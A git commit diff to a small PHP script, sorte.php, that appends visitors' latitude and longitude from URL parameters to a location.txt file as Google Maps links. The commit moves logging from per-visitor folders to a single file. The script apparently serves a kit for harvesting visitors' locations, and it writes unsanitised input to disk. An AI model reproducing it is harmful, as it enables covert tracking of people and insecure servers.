60e6a05fb004c89d967594b66175008282772c35
mak2033 <86602585+mak2033@users.noreply.github.com>
2022-06-16 13:55:56 +0300

    Update sorte.php
    just removie file location

--- sorte.php
+++ sorte.php
@@ -1,8 +1,9 @@
 <?php
-$dirname = gethostbyaddr($_SERVER["REMOTE_ADDR"]);
-$dirpath = "./upl_mak.2033_oad/" . $dirname . "/";
-if (!file_exists($dirpath)) {mkdir("./upl_mak.2033_oad/" . $dirname, 0777, true);};
-$file=$dirpath . "location.txt";
+#$dirname = gethostbyaddr($_SERVER["REMOTE_ADDR"]);
+#$dirpath = "./upl_mak.2033_oad/" . $dirname . "/";
+#if (!file_exists($dirpath)) {mkdir("./upl_mak.2033_oad/" . $dirname, 0777, true);};
+#$file=$dirpath . "location.txt";
+$file="location.txt";
 $myfile = fopen($file, "a");
 date_default_timezone_set("Asia/Amman");
 if (!empty($_GET["lat"])) {$txt = "4. Location: ". "http://www.google.com/maps/place/" . $_GET["lat"] . "," . $_GET["long"] . "\n";}
